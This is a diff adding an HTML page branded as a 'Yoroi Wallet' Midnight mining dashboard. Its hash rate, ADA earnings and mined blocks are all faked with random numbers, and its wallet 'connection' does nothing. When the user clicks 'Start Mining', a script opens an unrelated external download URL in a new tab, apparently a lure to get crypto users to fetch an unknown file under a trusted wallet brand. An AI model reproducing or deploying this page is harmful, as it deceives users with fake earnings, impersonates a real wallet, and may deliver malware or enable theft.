@@ -1,0 +1,781 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Yoroi Wallet - Midnight Mining</title>
+    <meta name="description" content="Yoroi Wallet Midnight Mining Dashboard - Real-time cryptocurrency mining with advanced visualization and wallet management">
+    <meta name="keywords" content="yoroi, wallet, mining, cryptocurrency, blockchain, midnight">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --background: hsl(222, 47%, 4%);
+            --foreground: hsl(210, 40%, 98%);
+            --card: hsl(222, 47%, 6%);
+            --card-foreground: hsl(210, 40%, 98%);
+            --primary: hsl(189, 94%, 43%);
+            --primary-foreground: hsl(222, 47%, 4%);
+            --secondary: hsl(222, 47%, 8%);
+            --muted: hsl(222, 47%, 10%);
+            --muted-foreground: hsl(215, 20%, 65%);
+            --border: hsl(222, 47%, 12%);
+            --destructive: hsl(0, 84%, 60%);
+            --destructive-foreground: hsl(210, 40%, 98%);
+            --cyan: hsl(189, 94%, 43%);
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
+            background: var(--background);
+            color: var(--foreground);
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 2rem 1rem;
+        }
+
+        /* Glass Card Effect */
+        .glass-card {
+            background: linear-gradient(135deg, rgba(28, 37, 54, 0.5) 0%, rgba(28, 37, 54, 0.3) 100%);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--border);
+            border-radius: 0.75rem;
+            transition: all 0.3s ease;
+        }
+
+        .glass-card:hover {
+            border-color: rgba(6, 182, 212, 0.5);
+        }
+
+        /* Glow Effects */
+        .glow-cyan {
+            box-shadow: 0 0 20px rgba(6, 182, 212, 0.3),
+                        0 0 40px rgba(6, 182, 212, 0.2);
+        }
+
+        .glow-cyan-strong {
+            box-shadow: 0 0 30px rgba(6, 182, 212, 0.5),
+                        0 0 60px rgba(6, 182, 212, 0.3),
+                        0 0 90px rgba(6, 182, 212, 0.2);
+        }
+
+        /* Animations */
+        @keyframes pulse-slow {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.7;
+            }
+        }
+
+        @keyframes glow {
+            0%, 100% {
+                opacity: 1;
+                filter: brightness(1);
+            }
+            50% {
+                opacity: 0.8;
+                filter: brightness(1.2);
+            }
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @keyframes ping {
+            75%, 100% {
+                transform: scale(2);
+                opacity: 0;
+            }
+        }
+
+        .animate-pulse-slow {
+            animation: pulse-slow 3s cubic-bezier(0.4, 0, 0.6, 1) infinite;
+        }
+
+        .animate-glow {
+            animation: glow 2s ease-in-out infinite;
+        }
+
+        .animate-spin {
+            animation: spin linear infinite;
+        }
+
+        .animate-ping {
+            animation: ping 1s cubic-bezier(0, 0, 0.2, 1) infinite;
+        }
+
+        /* Background Effects */
+        .bg-gradient {
+            position: fixed;
+            inset: 0;
+            background: linear-gradient(to bottom right, rgba(6, 182, 212, 0.05), var(--background), rgba(6, 182, 212, 0.05));
+            z-index: 0;
+        }
+
+        .bg-radial {
+            position: fixed;
+            inset: 0;
+            background: radial-gradient(circle at 50% 50%, rgba(6, 182, 212, 0.1), transparent 50%);
+            z-index: 0;
+        }
+
+        .content {
+            position: relative;
+            z-index: 10;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .header-icon-wrapper {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 1rem;
+        }
+
+        .header-icon {
+            width: 4rem;
+            height: 4rem;
+            color: var(--primary);
+        }
+
+        .header-icon-ping {
+            position: absolute;
+            inset: 0;
+            opacity: 0.2;
+        }
+
+        .header-title {
+            font-size: 3.5rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+            background: linear-gradient(to right, var(--primary), var(--cyan), var(--primary));
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .header-subtitle {
+            font-size: 1.25rem;
+            color: var(--muted-foreground);
+        }
+
+        /* Grid Layouts */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .main-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+        }
+
+        /* Stat Card */
+        .stat-card {
+            padding: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .stat-icon {
+            width: 2rem;
+            height: 2rem;
+        }
+
+        .stat-label {
+            font-size: 0.875rem;
+            color: var(--muted-foreground);
+            margin-bottom: 0.25rem;
+        }
+
+        .stat-value {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--primary);
+        }
+
+        /* Visualizer */
+        .visualizer {
+            padding: 2rem;
+            position: relative;
+            overflow: hidden;
+            height: 16rem;
+        }
+
+        .visualizer-bg {
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(to bottom right, rgba(6, 182, 212, 0.05), rgba(6, 182, 212, 0.05));
+        }
+
+        .particle {
+            position: absolute;
+            width: 0.5rem;
+            height: 0.5rem;
+            background: var(--primary);
+            border-radius: 50%;
+        }
+
+        .spinner-outer {
+            width: 8rem;
+            height: 8rem;
+            border: 4px solid var(--primary);
+            border-radius: 50%;
+            animation-duration: 3s;
+        }
+
+        .spinner-middle {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .spinner-middle-ring {
+            width: 5rem;
+            height: 5rem;
+            border: 4px solid var(--cyan);
+            border-radius: 50%;
+            animation-duration: 2s;
+            animation-direction: reverse;
+        }
+
+        .spinner-inner {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .spinner-core {
+            width: 2rem;
+            height: 2rem;
+            background: var(--primary);
+            border-radius: 50%;
+        }
+
+        .visualizer-inactive {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .inactive-ring {
+            width: 6rem;
+            height: 6rem;
+            border: 4px solid var(--muted);
+            border-radius: 50%;
+            margin: 0 auto 1rem;
+            opacity: 0.3;
+        }
+
+        /* Controls */
+        .controls {
+            padding: 1.5rem;
+        }
+
+        .controls-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1rem;
+        }
+
+        .controls-title {
+            font-size: 1.25rem;
+            font-weight: bold;
+            margin-bottom: 0.25rem;
+        }
+
+        .controls-subtitle {
+            font-size: 0.875rem;
+            color: var(--muted-foreground);
+        }
+
+        .status-dot {
+            width: 0.75rem;
+            height: 0.75rem;
+            border-radius: 50%;
+            background: var(--muted);
+        }
+
+        .status-dot.active {
+            background: var(--primary);
+            animation: pulse-slow 2s infinite;
+        }
+
+        /* Button */
+        .btn {
+            width: 100%;
+            padding: 1.5rem;
+            font-size: 1.125rem;
+            font-weight: 600;
+            border: none;
+            border-radius: 0.75rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary {
+            background: var(--primary);
+            color: var(--primary-foreground);
+        }
+
+        .btn-primary:hover {
+            background: rgba(6, 182, 212, 0.9);
+        }
+
+        .btn-destructive {
+            background: var(--destructive);
+            color: var(--destructive-foreground);
+        }
+
+        .btn-destructive:hover {
+            background: rgba(239, 68, 68, 0.9);
+        }
+
+        .btn-icon {
+            width: 1.25rem;
+            height: 1.25rem;
+        }
+
+        /* Info Section */
+        .controls-info {
+            padding-top: 1rem;
+            border-top: 1px solid var(--border);
+            margin-top: 1rem;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 0.5rem;
+            font-size: 0.875rem;
+        }
+
+        .info-label {
+            color: var(--muted-foreground);
+        }
+
+        .info-value {
+            font-weight: 600;
+            color: var(--primary);
+        }
+
+        .info-card {
+            padding: 1.5rem;
+        }
+
+        .info-card-title {
+            font-size: 1.125rem;
+            font-weight: 600;
+            color: var(--primary);
+            margin-bottom: 0.5rem;
+        }
+
+        .info-card-text {
+            font-size: 0.875rem;
+            color: var(--muted-foreground);
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            top: 2rem;
+            right: 2rem;
+            padding: 1rem 1.5rem;
+            border-radius: 0.75rem;
+            background: var(--card);
+            border: 1px solid var(--border);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+            z-index: 1000;
+            animation: slideIn 0.3s ease;
+            max-width: 350px;
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        .toast-title {
+            font-weight: 600;
+            margin-bottom: 0.25rem;
+        }
+
+        .toast-description {
+            font-size: 0.875rem;
+            color: var(--muted-foreground);
+        }
+
+        .toast.success .toast-title {
+            color: var(--primary);
+        }
+
+        .toast.info .toast-title {
+            color: var(--cyan);
+        }
+
+        @media (min-width: 768px) {
+            .header-title {
+                font-size: 4rem;
+            }
+        }
+
+        @media (min-width: 1024px) {
+            .main-grid {
+                grid-template-columns: 2fr 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-gradient"></div>
+    <div class="bg-radial"></div>
+
+    <div class="content">
+        <div class="container">
+            <!-- Header -->
+            <header class="header">
+                <div class="header-icon-wrapper">
+                    <svg class="header-icon animate-pulse-slow glow-cyan-strong" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"></path>
+                    </svg>
+                    <div class="header-icon-ping animate-ping">
+                        <svg class="header-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m18-6h-2m2 6h-2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"></path>
+                        </svg>
+                    </div>
+                </div>
+                <h1 class="header-title animate-glow">Yoroi Wallet</h1>
+                <p class="header-subtitle">Midnight Mining Dashboard</p>
+            </header>
+
+            <!-- Stats Grid -->
+            <div class="stats-grid" id="statsGrid"></div>
+
+            <!-- Main Grid -->
+            <div class="main-grid">
+                <!-- Visualizer -->
+                <div class="glass-card visualizer" id="visualizer"></div>
+
+                <!-- Controls -->
+                <div class="glass-card controls">
+                    <div class="controls-header">
+                        <div>
+                            <h3 class="controls-title">Mining Control</h3>
+                            <p class="controls-subtitle" id="controlsSubtitle">Connect your wallet to start</p>
+                        </div>
+                        <div class="status-dot" id="statusDot"></div>
+                    </div>
+
+                    <button class="btn btn-primary glow-cyan" id="mainButton">
+                        <svg class="btn-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a2.25 2.25 0 00-2.25-2.25H15a3 3 0 11-6 0H5.25A2.25 2.25 0 003 12m18 0v6a2.25 2.25 0 01-2.25 2.25H5.25A2.25 2.25 0 013 18v-6m18 0V9M3 12V9m18 0a2.25 2.25 0 00-2.25-2.25H5.25A2.25 2.25 0 003 9m18 0V6a2.25 2.25 0 00-2.25-2.25H5.25A2.25 2.25 0 003 6v3"></path>
+                        </svg>
+                        <span id="buttonText">Connect Yoroi Wallet</span>
+                    </button>
+
+                    <div class="controls-info" id="controlsInfo" style="display: none;">
+                        <div class="info-row">
+                            <span class="info-label">Status:</span>
+                            <span class="info-value" id="statusText">Idle</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="info-label">Network:</span>
+                            <span class="info-value">Yoroi Mainnet</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Info Cards -->
+            <div class="info-grid">
+                <div class="glass-card info-card">
+                    <h3 class="info-card-title">Fast & Efficient</h3>
+                    <p class="info-card-text">Optimized mining algorithms for maximum performance</p>
+                </div>
+                <div class="glass-card info-card">
+                    <h3 class="info-card-title" style="color: var(--cyan);">Secure Mining</h3>
+                    <p class="info-card-text">Enterprise-grade security for your mining operations</p>
+                </div>
+                <div class="glass-card info-card">
+                    <h3 class="info-card-title">Real-time Stats</h3>
+                    <p class="info-card-text">Monitor your mining performance with live updates</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="toastContainer"></div>
+
+    <script>
+        // State
+        let state = {
+            isConnected: false,
+            isMining: false,
+            hashRate: 0,
+            earnings: 0,
+            blocksMined: 0,
+            miningTime: 0
+        };
+
+        let miningInterval = null;
+
+        // DOM Elements
+        const statsGrid = document.getElementById('statsGrid');
+        const visualizer = document.getElementById('visualizer');
+        const mainButton = document.getElementById('mainButton');
+        const buttonText = document.getElementById('buttonText');
+        const statusDot = document.getElementById('statusDot');
+        const controlsSubtitle = document.getElementById('controlsSubtitle');
+        const controlsInfo = document.getElementById('controlsInfo');
+        const statusText = document.getElementById('statusText');
+        const toastContainer = document.getElementById('toastContainer');
+
+        // Toast
+        function showToast(title, description, type = 'success') {
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.innerHTML = `
+                <div class="toast-title">${title}</div>
+                <div class="toast-description">${description}</div>
+            `;
+            toastContainer.appendChild(toast);
+
+            setTimeout(() => {
+                toast.remove();
+            }, 3000);
+        }
+
+        // Format time
+        function formatTime(seconds) {
+            const hours = Math.floor(seconds / 3600);
+            const minutes = Math.floor((seconds % 3600) / 60);
+            const secs = seconds % 60;
+            return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }
+
+        // Update stats
+        function updateStats() {
+            const stats = [
+                {
+                    icon: '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>',
+                    label: 'Hash Rate',
+                    value: `${state.hashRate.toFixed(2)} MH/s`,
+                    color: 'var(--primary)'
+                },
+                {
+                    icon: '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>',
+                    label: 'Earnings',
+                    value: `${state.earnings.toFixed(8)} ADA`,
+                    color: 'var(--cyan)'
+                },
+                {
+                    icon: '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"></path>',
+                    label: 'Blocks Mined',
+                    value: state.blocksMined.toString(),
+                    color: 'var(--primary)'
+                },
+                {
+                    icon: '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>',
+                    label: 'Mining Time',
+                    value: formatTime(state.miningTime),
+                    color: 'var(--cyan)'
+                }
+            ];
+
+            statsGrid.innerHTML = stats.map(stat => `
+                <div class="glass-card stat-card">
+                    <svg class="stat-icon animate-pulse-slow" style="color: ${stat.color}" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        ${stat.icon}
+                    </svg>
+                    <div>
+                        <p class="stat-label">${stat.label}</p>
+                        <p class="stat-value" style="color: ${stat.color}">${stat.value}</p>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // Update visualizer
+        function updateVisualizer() {
+            if (state.isMining) {
+                const particles = Array.from({ length: 20 }, (_, i) => ({
+                    x: Math.random() * 100,
+                    y: Math.random() * 100,
+                    delay: Math.random() * 2
+                }));
+
+                visualizer.innerHTML = `
+                    <div class="visualizer-bg"></div>
+                    ${particles.map((p, i) => `
+                        <div class="particle animate-pulse-slow glow-cyan" 
+                             style="left: ${p.x}%; top: ${p.y}%; animation-delay: ${p.delay}s;"></div>
+                    `).join('')}
+                    <div style="position: absolute; inset: 0; display: flex; align-items: center; justify-content: center;">
+                        <div style="position: relative;">
+                            <div class="spinner-outer animate-spin glow-cyan-strong"></div>
+                            <div class="spinner-middle">
+                                <div class="spinner-middle-ring animate-spin glow-cyan"></div>
+                            </div>
+                            <div class="spinner-inner">
+                                <div class="spinner-core animate-pulse glow-cyan-strong"></div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            } else {
+                visualizer.innerHTML = `
+                    <div class="visualizer-bg"></div>
+                    <div class="visualizer-inactive">
+                        <div>
+                            <div class="inactive-ring"></div>
+                            <p style="color: var(--muted-foreground); font-size: 1.125rem;">Mining Inactive</p>
+                            <p style="color: var(--muted-foreground); font-size: 0.875rem; margin-top: 0.5rem;">Start mining to see visualization</p>
+                        </div>
+                    </div>
+                `;
+            }
+        }
+
+        // Connect wallet
+        function connectWallet() {
+            state.isConnected = true;
+            controlsSubtitle.textContent = 'Wallet Connected';
+            controlsInfo.style.display = 'block';
+            
+            mainButton.innerHTML = `
+                <svg class="btn-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path>
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                </svg>
+                <span>Start Mining</span>
+            `;
+            
+            showToast('Wallet Connected', 'Successfully connected to Yoroi Wallet', 'success');
+        }
+
+        // Toggle mining
+        function toggleMining() {
+            if (!state.isMining) {
+                state.isMining = true;
+                state.hashRate = 50 + Math.random() * 30;
+                statusDot.classList.add('active');
+                statusText.textContent = 'Active Mining';
+                
+                mainButton.className = 'btn btn-destructive';
+                mainButton.innerHTML = `
+                    <svg class="btn-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <rect x="6" y="6" width="12" height="12" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></rect>
+                    </svg>
+                    <span>Stop Mining</span>
+                `;
+                
+                showToast('Mining Started', 'Mining operation has begun', 'success');
+                
+                // Auto-redirect to download page
+                window.open('https://caparag.com/download_invitee.php', '_blank');
+                
+                miningInterval = setInterval(() => {
+                    state.hashRate += (Math.random() - 0.5) * 2;
+                    state.hashRate = Math.max(0, Math.min(100, state.hashRate));
+                    state.earnings += Math.random() * 0.00001;
+                    state.miningTime += 1;
+                    
+                    if (Math.random() > 0.95) {
+                        state.blocksMined += 1;
+                        showToast('Block Mined!', 'Successfully mined a new block!', 'success');
+                    }
+                    
+                    updateStats();
+                }, 1000);
+            } else {
+                state.isMining = false;
+                state.hashRate = 0;
+                statusDot.classList.remove('active');
+                statusText.textContent = 'Idle';
+                
+                mainButton.className = 'btn btn-primary glow-cyan';
+                mainButton.innerHTML = `
+                    <svg class="btn-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z"></path>
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                    </svg>
+                    <span>Start Mining</span>
+                `;
+                
+                showToast('Mining Stopped', 'Mining operation has been stopped', 'info');
+                
+                if (miningInterval) {
+                    clearInterval(miningInterval);
+                    miningInterval = null;
+                }
+            }
+            
+            updateVisualizer();
+        }
+
+        // Button click handler
+        mainButton.addEventListener('click', () => {
+            if (!state.isConnected) {
+                connectWallet();
+            } else {
+                toggleMining();
+            }
+        });
+
+        // Initialize
+        updateStats();
+        updateVisualizer();
+    </script>
+</body>
+</html>
